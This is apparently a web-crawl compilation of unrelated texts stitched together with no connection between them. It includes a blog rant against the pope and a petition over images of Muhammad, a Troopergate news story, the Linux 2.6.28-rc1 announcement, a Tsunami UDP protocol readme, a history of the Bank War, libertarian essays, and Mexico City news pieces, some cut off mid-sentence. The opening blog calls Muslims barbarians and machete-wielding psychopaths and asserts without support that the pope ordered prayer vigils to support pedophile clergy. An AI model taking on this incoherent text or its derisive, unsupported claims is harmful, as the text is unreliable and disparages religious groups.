I assume he does n't think that removing them from their posts is the most pragmatic solution and would rather leave it in the hands of god -- or in other words , do nothing .
He 's actually ordered every parish and diocese to set up prayer teams for round - the - clock vigils to help support the pedophiles in their midst .
The most disturbing quote , one that I 'm hoping was merely a nuance of translation , was , " The pope asked Roman Catholics to pray for the ' mercy of God for the victims of the grave situations caused by the moral and sexual conduct ' of clergy members in daily prayers of penance and purification , The Times of London said Monday . "
Hold on ... could you run that by me one more time ?
He wants them to pray that god has mercy ... on the victims ?!
I do n't think we 're in Kansas anymore , Toto -- we 've been transported straight to bizarro world .
Let me give the church some advice since I still possess the faculty of reason :
Stop covering up for these people !!
Either they are mentally ill or just sociopathic and have no business in a congregation , school , or possibly even in public .
The church 's willingness to cover for them ( note the use of the words " sexual conduct " instead of " misconduct " from the pope ) obviously persists to this day and likely will never stop .
Any person who willingly leaves their child in the care of these men of god is as delinquent and delusional as the pope apparently is .
( On a side note , I find it especially ironic that the first empire in search of global domination was in fact the catholic church , and now Ratzinger issues an encyclical highlighting the dangers of globalization .
Flip - flop much ?
When are you going to outlaw mass in the vernacular and start burning bibles in any language other than Latin ?
We all know how much more powerful the church was when nobody could understand that nonsense . )
-------------------------------------------------------------------------------------------------
The third , and final , course of irrationality that I 'm going to serve will be the petition floating around the interwebs demanding the removal of drawings depicting Mohammed from Wikipedia .
The text states that , " In Islam pictures or Prophet Muhammad ( PBUH ) and other holly figures are not allowed , but on wikipedia they has published some pictures that are showing not only a body with white face but an image that has a complete face .. that is even not allowed by SHITAT fact of Islam .
i request all my brothers and sisters to sign this petition so we can tell wikipedia to remove them .
http://en.wikipedia.org/wiki/Muhammad specially this image http://en.wikipedia.org/wiki/Image:Maome.jpg . "
First of all , work on your spelling .
It 's hard enough to read this without having to cringe internally with every other word just from the grammatical errors .
Secondly , Wikipedia is not run by Muslims , and therefore has no obligation to adhere to your silly laws .
The rest of us are free to depict him however we choose .
Just for good measure , I 've included some pictures of Mohammed .
Feel free to start a petition to have my blog removed from the internet , barbarians .
Anybody who would like to donate to help us increase security due to the likelihood of psychopathic idiots coming to chop off our heads with rusty machetes may do so here .
If they can get 34,000 signatures on their petition , we should be able to get a grand for some guard dogs , right ?
We may earn a commission when you use
one of our links to make a purchase .
Sept. 19 , 2008  --
An internal government document obtained by ABC News appears to contradict Sarah Palin 's most recent explanation for why she fired her public safety chief , the move which prompted the now - contested state probe into " Troopergate . "
Fighting back against allegations she may have fired her then - Public Safety Commissioner , Walt Monegan , for refusing to go along with a personal vendetta , Palin on Monday argued in a legal filing that she fired Monegan because he had a " rogue mentality " and was bucking her administration 's directives .
" The last straw , " her lawyer argued , came when he planned a trip to Washington , D.C. , to seek federal funds for an aggressive anti-sexual - violence program .
The project , expected to cost from $ 10 million to $ 20 million a year for five years , would have been the first of its kind in Alaska , which leads the nation in reported forcible rape .
The McCain - Palin campaign echoed the charge in a press release it distributed Monday , concurrent with Palin 's legal filing .
" Mr. Monegan persisted in planning to make the unauthorized lobbying trip to D.C. , " the release stated .
But the governor 's staff authorized the trip , according to an internal travel document from the Department of Public Safety , released Friday in response to an open records request .
The document , a state travel authorization form , shows that Palin 's chief of staff , Mike Nizich , approved Monegan 's trip to Washington , D.C. , " to attend meeting with Senator Murkowski . "
The date next to Nizich 's signature reads June 18 .
In response to inquiries about the document Friday , the McCain - Palin campaign provided a statement from Randy Ruaro , another aide to Palin .
According to Ruaro , Monegan asked for -- and received -- approval for the travel without telling Palin 's staff his reason for going .
" As a matter of routine , the travel was approved by Mike Nizich ... weeks before the actual purpose was made clear by former Commissioner Monegan , " Ruaro wrote .
" When you receive permission to travel , it does not mean that you receive blanket authorization to discuss or do whatever you would like on that trip , " he added .
Last week a legislative panel approved a subpoena for Nizich to be interviewed by Stephen Branchflower , the prosecutor hired to conduct the Alaska Legislature 's inquiry into Troopergate .
The Attorney General informed the Legislature earlier this week that Nizich and other state employees subpoenaed in the matter would not submit to interviews .
Nizich did not respond to a message left Friday afternoon .
In Palin 's court filing Monday – to stop an investigation by her state Personnel Board she earlier had requested – her lawyer , Thomas V. Van Flein , included numerous emails from her staff expressing confusion and incredulity over Monegan 's planned D.C. trip .
None of those emails were sent by or to Nizich , although he was cc'd on several .
Contacted Friday , Monegan confirmed the travel authorization was to pursue funding for the anti-sexual - violence program .
He said the travel authorization form was completed in a fashion consistent with practice , even though it showed no expenditures .
The signed form approved the travel , he said , and authorized him to use a government credit card or seek reimbursement for expenses he incurred during the trip .
Monegan said he did n't know why Palin 's chief of staff approved a trip that confounded her other aides .
" It sounds like it 's a breakdown of communication internal to the governor 's staff , " he said .

It 's been two weeks , so it 's time to close the merge window .
A 2.6.28-rc1
is out there , and it 's hopefully all good .
The changes in - rc1 are ( as usual ) too many to really enumerate , with the
bulk of them being - again as usual - drivers .
In fact , that 's doubly true
now that we merged the drivers from the staging tree .
The dirstat output
makes that very obvious :
3.3 % arch / arm /
14.2 % arch /
3.1 % crypto/
4.0 % drivers / media /
3.7 % drivers / net / wireless /
10.3 % drivers / net /
6.5 % drivers / staging / me4000 /
8.5 % drivers / staging / slicoss /
4.8 % drivers / staging/wlan-ng /
29.7 % drivers / staging /
63.6 % drivers /
3.3 % include /
4.6 % net /
4.6 % sound /
but some other statistics may be fun :
- 7141 non-merge commits ( and 419 merges )
- average non-merge commit :
39 lines removed , 104 lines added
( not counting renames )
- About 880 individual authors
- 340 of which had just one commit
- while 183 authors had ten or more commits
- Most screwed - up clock award goes to :
Greg Kroah - Hartman
for his commit 51b90540 , which claims to be from April 9 - six years
ago !
And it 's a fix to a driver that was merged this July !
Way to go , Greg !
Anyway , have fun , please test it , and report any intersting anomalies you

The U.S. Army is developing a synthetic telepathy technology that acts as a computer interface controlled directly by your thoughts .
They are hoping to produce a system capable of composing an email , sending a voicemail or playing a video game using thought alone .
This development in techlepathy is being conducted by researchers at the University of California , the University of Maryland as well as Carnegie Mellon University and consists of two parts .
The first being the composition of a message destined for either another individual or a computer .
The second part involves the transmission of the telepathic message using thought alone .
The required headset would incorporate an electroencephalograph ( EEG ) scanner to capture your brain ’s electrical activity .
This would then be interpreted into language and commands by the onboard computer using a similar process to voice recognition software .
You can see a video demonstration of its use as a video game interface at Discovery Tech .
The system could also be used by people suffering from spinal injuries to increase their independence and could provide an even better solution than the unique Joystick Tongue interface that ’s in development .
One of the biggest obstacles is accurately tracking the brain ’s signaling without placing electrodes inside the skull , like with the monkey who controlled a robotic arm with its brain .
This is an interesting development , but unfortunately , is still quite a way from becoming a reality ( 15 - 20 years ) .
It does raise an important question though .
While this kind of technology could radically improve the simplicity of computer interaction and enable new forms of communication , we need to consider whether we ’re willing to place the same kinds of control on our thoughts as we apply to our speech .
Would this even be possible ?
If it were , it might not be a big deal initially , but as the technology spreads and becomes more and more ubiquitous , we may find ourselves in a quite a privacy / self - imposed censorship quandary .

The Bank War is the name given to Andrew Jackson 's attack on the Second Bank of the United States during the early years of his presidency .
However , the First Bank of the United States first influenced by Alexander Hamilton in 1791 was the origin of the Bank War controversy .
However , in 1832 Andrew Jackson vetoed the renewal of the Second Bank of the United State ’s charter .
Jackson viewed the Second Bank of the United States as a monopoly since it was a private institution managed by a board of directors .
Its president , Nicholas Biddle , exercised vast influence in the nation 's financial affairs .
edit ] History of the Banks of the United States
The First Bank of the United States was created in 1791 under the influence of Alexander Hamilton .
The Bank of the United States was originally a commercial bank that served the public as well as a bank for the United States government .
However twenty years later , the First Bank of the United States ’ charter was not renewed .
The bank was therefore terminated .
In April of 1816 , Congress reestablished a national bank when they approved the Second Bank of the United States .
The Second Bank of the United States was established after the War of 1812 , in order to make the nation ’s currency uniform . [ 1 ]
The U.S. government expanded its capital to 35 million dollars when the Second Bank of the United States was created .
The Second Bank of the United States increased its banknotes , credit , and financial responsibility throughout America .
Eventually , an increase in loans and credit expansion led to land speculation .
This resulted in the Panic of 1819 , which caused the common American to lose confidence in the banking system .
In 1823 , Nicholas Biddle became president of the Second Bank of the United States .
His goal was to reestablish the economy ’s security by controlling the use of currency and banknotes .
edit ]
Beginning of the War
The Bank War started in 1830 , when Henry Clay presented Congress with a bill to renew the 2nd Bank of the United States in order to make it an election issue .
Knowing that Jackson would veto the bill , Clay believed that it would anger many influential and wealthy people in the East .
But when Jackson vetoed the bill , it appealed to the masses , who felt that the bank was to blame for the Panic of 1819 , and Jackson easily won in the United States presidential election , 1832 .
edit ] Debate of Jackson ’s Veto
Andrew Jackson ’s background portrayed why he vetoed the re-chartering bill of the Second Bank of the United States .
Jackson owed debts to banks during his youth and was a strong advocate for hard money ( coins ) .
His negative personal experiences contributed to his hostility towards banks and the use of paper money . [ 2 ]
Jackson ’s popularity among the average American citizen was not well received by America ’s elite .
Henry Clay and Nicholas Biddle were among this group of elitists who did not support Jackson .
By understanding Jackson ’s view of banks , his veto against the Bank was not unexpected .
Consequently , Jackson 's veto provoked a lot of debate .
He was viewed by Daniel Webster to be a monarchical president because he used his presidential power to veto liberally .
Henry Clay tried to get Jackson impeached by alleging " Jackson claimed powers greater than European kings . ” [ 3 ]
The Senate approved the motion to censure Jackson .
However in response , Andrew Jackson wrote to the Senate claiming that Maine , New Jersey , and Ohio were in support of his vetoes .
These states legislatures considered Jackson ’s vetoes to be wise and constitutional .
edit ]
Whigs and democrats
Strong opposition against President Jackson slowly grew to form the Whig political party .
This political party was similar to the English Whigs in that they were against tyranny and monarchy .
The members were only united by their hatred towards Jackson and thus had little compatibility .
Most of their support came from Northern merchants , Northern manufacturers , Southern landowners , and some Western farmers seeking internal improvements . [ 4 ]
Later , the Federalists and National Republicans joined the Whig party .
However , this collaboration of people was not strong in its opposition to Jackson because they did not agree on enough issues .
This allowed Jackson to continue Democrat rule , without strong opposition .
edit ] Outcome of Bank War
Jackson was upset about Henry Clay and Daniel Webster trying to renew the charter early for the Second Bank of the United States .
With the election of 1832 secured , Jackson proceeded to destroy the Bank of the United States .
Jackson then turned against Nicholas Biddle and proceeded to take government funds out of the Second Bank of the United States .
He put these funds into privately owned banks , which were coined the name pet banks .
The pet banks also printed huge amounts of paper money .
These pet banks caused inflation and led to the Panic of 1837 .
Jackson 's first two Secretaries of Treasury opposed the removal of the national deposits and were forced to resign .
Jackson appointed Roger Taney as his new Secretary of Treasury who approved the removal of national debts .
Consequently , the country lapsed into periods of recessions and surpluses .
In an effort to take control of the unstable economy , Jackson issued the Specie Circular in 1836 .
This document required all purchases of federal lands to be paid in metal coin rather than paper money .
This decree also contributed to the Panic of 1837 .
By this point , Jackson had completed his term in office .
The financial problems that he created were passed on to his successor , Martin Van Buren .

Tsunami UDP Protocol
Tsunami UDP Protocol : A fast user - space file transfer protocol that uses TCP control and UDP data for transfer over very high speed long distance networks ( ≥ 1 Gbps and even 10 GE ) , designed to provide more throughput than possible with TCP over the same networks .
The project is based on original Indiana University 2002 Tsunami source code , but has been significantly improved and extended .
As such , large portions of the program today are courtesy by Aalto University Metsähovi Radio Observatory .
Includes FTP - like client and server command line applications for normal file transfers .
It has additionally been extended for high rate real - time data streaming in eVLBI radio astronomy and geodesy ( VSIB , PCEVN DAQ ) .
Licensed under the original IU open source license .
Updates
Version 1.1 cvsbuild 40 has automatic achieved rate memorization and several changes for smoother transfers .
Beginning with version 1.1 cvsbuild 29 Tsunami now ( 09/2007 ) supports transfers between different - endian machines .
Listing shared files with dir is supported since cvsbuild 27 .
Mac OS X / Darwin works beginning with cvsuild 36 .
For more changes , see the changelog .
The previous CVS update was on 22 December 2009 .
The code was migrated from CVS to Git in July 2019 .
Background
The original early Tsunami UDP transfer protocol developed and released to the public in 2002 by Mark Meiss et al. at the Pervasive Technology Labs at Indiana University ( IU ) can still be found at http://anml.iu.edu/research.shtml?prim=lab_research.
This project is a derived work - if not a complete rewrite - of the original IU source code .
The new Tsunami includes a large number of bug fixes , improvements and new features .
File releases in the form of compressed source code archives can be downloaded from the project page at http://sourceforge.net/projects/tsunami-udp, but I recommend you 'd use the CVS version .
Source code access
Currently no binaries are distributed , only the source code is available and should be compiled on the target system .
It should compile fine on all POSIX systems and on GNU / Linux , no special libraries or toolkits are required .
Microsoft Windows and Vista are not supported ( XP offers an optional POSIX layer , but some parts of Tsunami code would have to be slightly adapted neverheless , and unfortunately in Vista Microsoft has abandoned POSIX altogether ) .
Any current version of source code pulled from Git master will compile and work , and has been tested somewhat extensively .
The Git version is likely to contain new features .
There are no guarantees any new features are going to work correctly with older versions of the Tsunami client / server .
Nevertheless , in the basic features , Tsunami generally is backwards compatible .
If you want to get a non-changing stable release version , you may check out the following Git tags ( former CVS tags ) : v10_RTM_protorev20061025 ( v1.0 released 31 . Nov 2006 ) , v11_build11_protorev20061025 ( v1.1 build 11 released 5 . Jan 2007 ) , v11_build16_protorev20061025 ( v1.1 build 16 released 24 . May 2007 ) , v11_build29_protorev20061025 ( v1.1 build 29 released 29 . Aug 2007 ) , v11_build36_protorev20061025 ( v1.1 build 36 released 26 . May 2008 ) .
There are other tags , please see ViewCV .
Alternatively , some probably significantly less up to date source code . tar. gz files can be downloaded from file releases .

09Nov07 : Those with a sluggish Petabit / sec network connection ;) can try the protocol version 1.2 in CVS branch protocol_v12 _branch .
Still unstable and experimental .
The set rate value in v1.1 has only 32 bits and thus limits the user - settable rate to 4 Gbps .
Not so in v1.2 .
Checkout like above but with tag -r protocol_v12 _ branch tsunami-udp .
Note that v1.2 can't connect to v1.1 protocol version software and vice versa .
Later goals are to add blocking send_data ( ) and receive_data ( ) API functions to make Tsunami less a file and more a data transfer protocol .
Hardware requirements
Consumer PC motherboards are highly suitable
Disk : to achieve high transfer rates , disk I /O must be adequately fast .
It is essential to use fast RAID , e.g. RAID0 with a large chunk size setting such as 512 kB .
Linux software RAID using mdadm performs well enough - typical performance with 4 SATA disks is around 1.8 Gbit/s ( 05/2007 ) .
You can check your disk throughput with hdparm -t / dev/md0 , it should be 100 MB /s or better .
, it should be 100 MB/s or better .
CPU : the CPU should be Pentium4 or better .
Consumer multi-core CPUs are quite nice .
RAM : the client program requires up to 128MB of free memory for internal buffers , and swapping has to be avoided at all cost , thus at least 512MB of RAM is strongly recommended .
NIC : any motherboard 1 Gbit/s Ethernet is usually sufficiently fast .
Server grade NICs are completely unnecessary .
Usual 10 Gbit/s PCIe NICs can be used , too .
Network : the network connection should be faster than the typical home broadband connection , for example a 630 Mbit/s or 1/10/40/100 Gbit /s fibre connection .
Jumbo frames are not strictly required , but they can boost performance if you want to use rates higher than 5 Gbit / s. Lightpaths , guaranteed bandwidth QoS services etc are a matter of debate , my take is to only consider them after ( if ever ) network people start complaining about your traffic ( and then first try the ' you sold us a 10 Gbit /s connection so we darn well are going to transfer at 10 Gbit / s ' route ;-) .
Typical transfer rate examples
Below are a few examples of transfer rates that Tsunami can achieve over the Internet .
On a local LAN , for disk - to - disk transfers rates near the limit of the PC NIC or on - board LAN are easily achieved , which is usually around 940 Mbps for 1G LAN .
This is provided that the disk system in both PCs is adequately fast , e.g. simple software RAID - 0 with three or four SATA disks ( no RAID controller necessary ) .
Figure 1 - international transfer over the Internet , averaging 800 Mbit / second
Figure 1 shows a throughput plot of a disk - to - disk transfer where several multi-gigabyte files are transferred one after another from Helsinki , Finland to Bonn , Germany .
Both PCs have a fast ( > 1 Gbps capable ) RAID - 0 .
Linux software RAID - 0 with 4 SATA disks on the sending side , with a Dell Optiplex GX620 cheap PC .
SATA RAID card at the receiving side .
The server side had 10 Gbps fibre to the Finnish ' Funet ' GEANT2 NREN , the client side had a shared fibre to the Viola GEANT2 NREN with ~1 Gbps allocated capacity .
Figure 2 - a short 20 GB file transferred with Tsunami v1.2 over local 10 Gbps LAN at Metsähovi .
Figure 2 shows a Tsunami v1.2 test transfer on the local 10G LAN at Metsähovi .
RAID - 0 were built with Samsung SpinPoint F1 disks on dual and quad - core consumer computer systems with Chelsio 10G cards connected via a HP6400 cl switch .
The transfer rate is limited to 4.3 Gbps by disk I/O .
With diskless transfer a rate of 7 Gbps could be achieved .
Project admin and developer : Jan Wagner ,
On wheels , we charge -- a vast and exultant army of cycling , skating , spinning , scooting , sweating warriors in the thrill of conquest .
We rule this city -- at least for a few hours .
Every Sunday morning , some of the biggest streets of car - flooded Mexico City are handed over to bicyclists , who roll in by the tens of thousands .
Joining them are skateboarders , rollerbladers , toddlers on push toys and parents behind strollers in what has become a weekly festival on wheels .
The leftist government of Mayor Marcelo Ebrard launched the program last year , barring cars , trucks and buses from the regal Paseo de la Reforma and other streets around the historic downtown .
Once a month , the route is expanded to form a 20 - mile , engine - free circuit called the Cicloton .
Advertisement
The cyclist ’s gain is the motorist ’s loss .
But city officials seek to limit the traffic snarls by opening alternative routes and letting cars across key downtown junctions once the bikes have passed .
On a couple of short stretches , cars and bikes share the street in rare harmony , separated by orange traffic cones .
( If only the exhaust fumes stayed in their own lane . )
Though mocked by some as a political gimmick , the Sunday ride has proved highly popular since it began in May 2007 .
The shorter downtown rides routinely draw 10,000 or more participants , the Cicloton as many as 70,000 .
It ’s an upside - down day .
For a change , cars are the intruder while cyclists get a leisurely , intimate view that makes this huge and tumultuous city seem , well , not so huge and tumultuous .
We strap on helmets and spend two to three hours on a citywide loop : zooming past glassy high - rises and triumphal statues , through graffiti - spattered precincts where sidewalk stands send up a tang of raw seafood , along normally jammed commercial boulevards lined with chain stores and sex - driven billboard ads .
Advertisement
We are Mexico City residents of all shapes and styles , from Lycra - clad speed demons to wobbly tykes on training wheels .
There are gleaming road bikes and creaking wrecks that appear to predate the 1968 Olympics here .
Signs abound of classic Mexican innovation , like the tiny wooden chair converted , by straps and blind faith , into a child ’s bicycle seat .
The party mood is accentuated by a string of roadside tent stations set up to offer open - air exercise classes , refills on water , and plenty more .
You can even get a tire fixed for free .
Mostly , there is an air of relief from the rigors of the sprawling megalopolis , whose 20 million residents spend much of the week dueling one another on the roads .

“ Traffic is chaotic .
People are racing around , stressed .
Cars do n’t respect bicyclists , ” said 37 - year - old Edgar Campos , who slowly pedaled an undersized bike along an avenue near the leafy downtown park known as the Alameda Central .
“ Today is a completely different day . ”
His twin daughters , 11 , rode bikes , as did his 10 - year - old son .
Another son , 14 , shuffled along on roller skates .
For Campos , even police are a welcome sight on these Sundays .
Usually viewed as more interested in seeking payoffs than protecting residents , the officers are posted at intersections to keep cars at bay .
“ It ’s one day , ” Campos conceded .
“ Still , it ’s difficult to get even that . ”

If biking here feels like a novelty , it ’s not hard to see why .
Though it ’s safe to ride in the relative calm of certain neighborhoods or a few big parks , venturing into Mexico City traffic can feel like the cycling equivalent of the running of the bulls .
About 4 million vehicles jam the streets daily , and drivers appear to share a guiding tenet :
Anything goes if it gets you there quicker .
Motorists switch lanes suddenly and dart around corners without signaling .
Red lights are often treated as mere suggestions .
Newcomers may gasp the first time they see cars zipping in opposite directions around big traffic circles .
Because there is n’t much of a cycling culture here , drivers pay little heed to people on two wheels .
Advertisement
On a bike , you ’re basically on your own , and , as a result , few people even try riding one .
( Polls show 1 in 100 Mexico City residents gets around by bicycle . )
“ The main barrier to people using bicycles as a form of transportation is the fear people have of getting in an accident caused by a vehicle , ” said Jesus Gil Aldeco , who belongs to Bicitekas , a group here that promotes cycling as a means of daily transportation .
Mexico City has few bike lanes , and a plan for a 400 - mile network of them snaking through the city is stuck in bureaucracy .
With slim odds of improvement any time soon , Bicitekas plans to open a school to teach cyclists how to survive the hostile conditions .
A better solution , cyclists say , would be to create a climate in which motorists respect riders -- or fear prosecution if they do n’t .
“ The culture of the road is very poor , ” said Gil .
Advertisement
Cyclists and officials say the Sunday rides are beginning to change that , one pedal stroke at a time .
Riding through downtown , we bump over cobblestone streets a few blocks from where the Aztecs worshiped , then wheel down a stretch of cut -rate dress shops thumping with music .
Beyond markets selling Dora the Explorer pinatas and glittery fabric masks worn by lucha libre wrestlers , the route becomes grittier , tracking a power line and drab apartment clusters on a long , flat roadway before the first climb appears .
A hill ?
Hardly .
It ’s a highway overpass .
On top , Raul Lopez is catching his breath and peering out over an outdoor subway station and eight - lane highway leading away from town .
From below comes the low roar of cars and buses , the wail of an ambulance .
Advertisement
Lopez , 54 , knows well the hostile ways of these roads .
He drives a bus .
For six days a week he ’s a man in combat , piloting his boxy vehicle through choked streets along the city ’s edge .
On this day , though , Lopez and his wife , Marta , a 53 - year - old nurse , are pedaling Mexico City ’s streets with the sweaty abandon of schoolchildren .
Soon , he ’ll slip back into the driver ’s seat for another week ’s stresses .
But right now , astride his shopworn 10 - speed , his wife beside him on a road that remains free of car traffic for miles ahead , Lopez feels good .
Better , actually .
“ Perfect , ” he said .

Every news report , and every bit of new blather from George W. " I love free markets " Bush , reminds us of George Washington ’s position , " Government is not reason ; it is not eloquent ; it is force .
Like fire , it is a dangerous servant and a fearful master . "
As we consider our government ’s forced federal bailout / buyout of what many Americans believed were private banking , investment , insurance , and auto industries , the key word is not " government bailout , " or " nationalized " or " socialism , " or even " private . "
As George Washington and his compatriots understood , the key word is " force . "
American foreign policy has long been based on force , and force alone .
Forcing people out of arrangements disliked by " our government " and its friends .
Forcing people into arrangements that pleased " our government " and its friends .
In World War I , we joined a war just to have a place at the table , from which to force " our government ’s " vision and preferences .
The list goes on and on , all the way to Iraq Part Deux and Afghanistan .
The central theme is not , and was never , freedom .
It was , and remains , force .
In no case of our expeditionary wars and interventions was this force ever brought to bear without a certain key motivating factor , a fundamental animator .
Dare I say it out loud , in this decade of the fool - me - one - hundred - times boobus Americanus ?
This woebegotten species residing on Main Street suspects the truth already :
The god who breathes life into our government , fans its flames and if necessary , restrains it , is the state - aligned and state - leveraging corporate class — not boobus .
With war and foreign policy , government force is an easy sell .
You ’re with us , or ag ’in us .
Support the president , be a patriot , else be a terrorist and a traitor .
Support the troops , wherever they are and whatever they are doing , or leave the country .
Such foreign policy is always expensive , destabilizing , and deadly .
It ’s a good thing domestic policy is not conducted this way , huh ?
During the recent permutations of the bailout , some reporters even used words like socialism and communism to describe the situation , indicating that this was n’t how it is supposed to be .
But what we have really been observing is not ideology .
It is brute application of government force , up close and personal .
No guns or tanks were used .
Printing presses and penalties , executive orders and mandates , effectively forcing valueless paper and market - opposing behaviors on producers and consumers alike , were more than sufficient .
Call me boobus , but we were not consulted about this use of the tax - and debt - funded till , and we will never be .
The government tells us we have no choice in currency , and no freedom to even think about alternatives to federal decisions .
Without choice , we submit , as the weak always do to those who wield — or are perceived to wield — greater strength .
The empire has come home , and it has made us the occupied , the enslaved .
Just as the American empire abroad has been motivated and animated by corporate interests , it is so here at home .
While many Americans are dazed and confused by this turn of events , they need n’t be .
Kevin Carson explains how it works in a brilliant article published by the Foundation of Economic Education ’s monthly , Ideas on Liberty .
He writes , " … the corporate economy is so closely bound up with the power of the state , that it makes more sense to think of the corporate ruling class as a component of the state … . "
He explains , " The ruling class allows some amount of voluntary market exchange within the interstices of a system whose overall structure is defined by coercive state intervention . "
The article from which these statements are taken is about the nature of free market reforms , and understanding primary and secondary forms of state intervention in the economy .
A wonderful result of the current " crisis " has been that a majority of Americans are actually thinking about , for the first time , the nature of such government intervention .
Unfortunately , like most of our Congress , most are thinking about it in an emotional and uninformed way .
But that will change , and change rapidly .
Coercion and force are concepts with which Americans are long familiar and quite comfortable , at least in foreign policy .
It ’s a bit different when these chickens come home to roost .
There are ways to deal with this homecoming , and happily violence is not necessary to bring down an empire .
As Michael Rozeff suggests
" If the black hole of government proves too powerful for the concerted action of its citizens to control it , then they will control it by their own personal and individual actions . "
I would assume these actions include — and are not limited to — reducing and eventually eliminating our physical , moral , verbal , spiritual , and financial support of the corporate state .
Instead , we will increasingly choose to support ourselves , those about whom we care , and those with whom we choose to trade , in the marketplace of both goods and ideas .
We will shun the state .
If this sounds unreasonable , utopian , or radical — consider that the most upstanding and traditional - minded sector in our localities — community banks — are leading the way .
The nature of empire is to expand until it becomes unsustainable and intolerable .
The American empire ’s collapse — something we should fervently hope to witness in our lifetimes — will occur through the actions of millions of people , who first recognize the absurdity and injustice of government coercion abroad and at home , then reject that coercion — and ultimately proceed , each day , at their own lead , and by their own consent .
Now is the time for Americans to embrace the idea that government should be neither our master , nor our servant .
The Best of Karen Kwiatkowski
A day after Richard S. Fuld Jr. was compelled to explain the millions of dollars he made at Lehman Brothers , two former executives of the American International Group took their turns in government witness chairs on Tuesday , answering critical questions from lawmakers about business and pay practices and outsize spending that continued even after the company received an $ 85 billion lifeline from the government .
One particular point of contention during the hearing before the House Oversight and Government Reform Committee was a weeklong retreat that a life insurance subsidiary , AIG General , held for its top sales agents at the St. Regis Resort in Monarch Beach , Calif. , only a week after the government extended its $ 85 billion loan last month .
The $ 442,000 in expenses for the week included $ 150,000 for food and $ 23,000 in spa charges , according to documents obtained by the committee .
Joe Norton , A.I.G. ’s director of public relations , said in an interview that the event had been scheduled last year , though he did not know whether executives had considered canceling the retreat after the bailout .

In my hometown , the peace rallies are always sponsored by the Unitarians .
Actually , it is they who are the participants too .
This is not a highly heterogeneous group .
In fact , you know them already : highly educated , ideologically driven according to conventional left - wing moorings , attracted to fashionable causes like global warming and the mortal threat posed by plastic grocery bags , and hypertolerant of all points of view except those with which they disagree .
In some way , they stand in proxy for all the " gownies " in this college town , but distinguish themselves for actually standing up for what they believe in .
Most of the professors are sympathetic to their antiwar cause , and are rather disgusted by the dumbed - down and reflexive foreign - policy belligerence of the " townies , " who regard every new war as a test of national pride .
The professors are not activists , so they let the Unitarians do the heavy lifting of driving the townies crazy with " unpatriotic " protests .
In this , they are united against the bourgeois Baptists at the middle - brow churches in town , who hear sermons about the how God is a man of war and how Islam threatens our very way of life , so we had better get them before they get us .
Their " patriotism " is summed up by hyperloyalty to the Republican Party , pledging allegiance to the flag , and treating it and other symbols of the nation - state as if they were holy relics .
This is a summary of my town 's politics concerning war , and I suspect that it is not unlike your town .
The intellectuals of the Left are antiwar ; the average Joe on the street is prowar .
So entrenched is this demographic that we just take it for granted and presume it has never been otherwise .
The world as portrayed in Bill Kauffman 's fantastic new book is radically different , even upsidedown from the one we know .
And yet the world he presents seems to make more intuitive sense .
The title gives you the flavor : Ain't My America : The Long , Noble History of Antiwar Conservatism and Middle - American Anti-Imperialism ( NY : Metropolitan Books : 2008 ) .
What he has done in 281 pages is write a super - entertaining , very well - researched , and enormously enlightening history of how middle America has traditionally been the largest and most effective force of resistance to the imperial garrison state .
This has been true from the early years of the Republic ( in which the Founders warned against not only foreign intervention but even any standing army at all ) through the interwar period , when the then - largest mass movement in American history rallied against entering World War II .
In great detail , he alerts us to the politics of the least - discussed and least - understood war of them all : the Great War or World War I .
In this episode , the Left was on the side of the war , with the hope that the state would try an experiment in national economic planning , crush old - world forms of government abroad , and usher in " progressive " policies such as income taxes , central banking , and presidential dictatorship .
They got their way , while the group we might call the Right cried foul .
Opposition came from farmers , Main Street Republicans , and old - school classical liberals .
The author provides fantastic quotations from speeches in Congress that opposed entry into war , generally viewing it as a war by and for elites against the people .
It was patriotism that drove the opposition .
" As I love my country , " said Isaac Sherwood of Ohio , " I feel it is my sacred duty to keep the stalwart young men of today out of a barbarous war 3,500 miles away in which we have no vital interest . "
Many of the speeches he quotes are downright inspiring , not only because of the words but also because it is great to see them all resurrected again .
Official historians have tended to act as if the opposition had no good points — or did n't exist at all .
Kauffman shows that they were principled and even prophetic .
More than that , he shows that the opposition to war here stemmed from conservative values .
But this turned out to be a warmup for the opposition to the entry into World War II .
We are supposed to believe that because we won that one unequivocally , the opponents of entry had nothing to say worth remembering .
In fact , the opponents saw FDR's war as the second part of the New Deal : instead of dealing with unemployment , send them to foreign lands to kill and be killed .
The drive to war was opposed by the America First movement , which was huge and marvelous in so many ways , even if they did get crushed by wicked propaganda then and ever since .
The author revisits their arguments and refutes the myths surrounding them , e.g. , that they were fascistic or ignorant or provincial or underestimating risk abroad .
But his main point is demographic and intellectual : to be against war was to be for America , for patriotism , for the love of home and liberty .
He demonstrates this many times over .
He goes further to dip into the early history of the Cold War to show that the American Right was against intervention .
They had seen the way war politics was used to build the state , and had had enough of the tendency to give up ever more liberty .
Many heroes emerge here from the early 1950s , with right - wing pundits and politicians sounding not that much different from how the New Left sounded only a decade and a half later .
What Kauffman has done here is more than merely sketch a history , though it is wonderful and detailed history .
He has fashioned a new way to look at the makeup of the politics of war .
I found it interesting that during the 1990s , it was the Republicans who emerged as the anti-nation - building party as the Democrats embraced their Wilsonian heritage .
After 9 - 11 , the roles switched yet again , and today the Republicans are guilty of trafficking in the worst forms of jingoism .
The author urges us to rethink what it means to be a conservative .
In part , it means to favor the human scale and to oppose far - flung attempts to remake the world through elite manipulation .
Is it really so unreasonable that conservatives should make the antiwar cause their own ?
Read Kauffman and see if you rethink your position .
" There is nothing conservative about the American Empire , " he writes .
" It seeks to destroy — which is why good American conservatives , those loyal to family and home and neighborhood and our best traditions , should wish , and work toward , its peaceful destruction .
We have nothing to lose but the chains and taxes of empire .
And we have a country to regain . "
Until he was gunned down over the weekend , Salvador Vergara Cruz was a man of some influence with a promising future in his political party .
Mayor of an important resort town outside Mexico City , and a close confidant of his state ’s governor , Vergara apparently felt sufficiently at ease to travel without a specially assigned team of bodyguards despite receiving death threats from purported drug lords .
The 34 - year - old Vergara was killed by hooded assassins armed with semiautomatic rifles as he drove with other officials toward his home city of Ixtapan de la Sal on Saturday afternoon .
The killing of a sitting elected official may turn out to be one of the more significant political slayings in Mexico ’s raging drug war , not so much because of who he was as for what his death represented .
Prosecutors in the state of Mexico say Vergara was killed because he refused to allow drug gangs to move into and operate freely in his city , along a transit route for drugs into the nation ’s capital .
Still , by Tuesday , Mexican authorities had arrested 14 suspects , including the mayor ’s former driver and two men named as the shooters .
Some of the suspects , prosecutors say , claimed to be members of La Familia , a gang of drug runners and hit men based in neighboring Michoacan state .
This would constitute further and especially forceful evidence of efforts by the gang to move into the state of Mexico , ever closer to the center of national authority .
Payoffs demanded
